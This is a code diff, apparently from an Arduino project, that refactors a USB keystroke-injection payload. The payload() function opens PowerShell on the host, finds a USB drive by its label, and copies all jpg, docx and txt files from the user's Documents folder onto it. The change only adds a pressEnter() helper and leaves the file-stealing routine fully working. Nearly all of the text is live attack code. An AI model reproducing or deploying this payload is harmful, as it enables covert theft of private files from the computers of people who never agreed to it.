@@ -24,28 +24,25 @@ void payload(){
   Keyboard.releaseAll();
   delay(100);
   Keyboard.print("powershell");
-  Keyboard.write(0x0D);
-  Keyboard.write(0x0A);
+  pressEnter();
   delay(1500);    // wait for powershell to launch. If it doesn't launch in time, the next keystrokes will be useless
   Keyboard.print("cd Documents");   
-  Keyboard.write(0x0D);
-  Keyboard.write(0x0A);
-  delay(100);
+  pressEnter();
   Keyboard.print("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'NAME' } | select name"); // change NAME to your flash name
   String fileTypes[] = {"jpg","docx","txt"};
-  Keyboard.write(0x0D);
-  Keyboard.write(0x0A);
-  delay(100);
+  pressEnter();
   for (int i = 0; i < sizeof(fileTypes)/sizeof(fileTypes[0]); i++){
     Keyboard.print("copy *." + fileTypes[i] + " $usbpath.name");
-    Keyboard.write(0x0D);
-    Keyboard.write(0x0A);
-    delay(100);
+    pressEnter();
   }
   Keyboard.print("exit");
+  pressEnter();
+  
+}
+
+void pressEnter(){
   Keyboard.write(0x0D);
   Keyboard.write(0x0A);
   delay(100);
-  
   
 }
